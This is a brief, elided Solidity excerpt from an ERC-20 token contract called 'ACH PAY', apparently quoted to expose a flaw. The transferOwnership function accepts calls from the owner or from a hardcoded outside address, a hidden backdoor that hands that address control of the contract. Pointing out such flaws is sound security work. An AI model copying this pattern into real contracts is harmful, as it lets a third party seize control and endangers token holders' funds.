...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x06BcEd052C32F392b2f71563e0A4A2171d02eDbf));
...
contract ACH is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "ACH";
  string private _name = "ACH PAY";
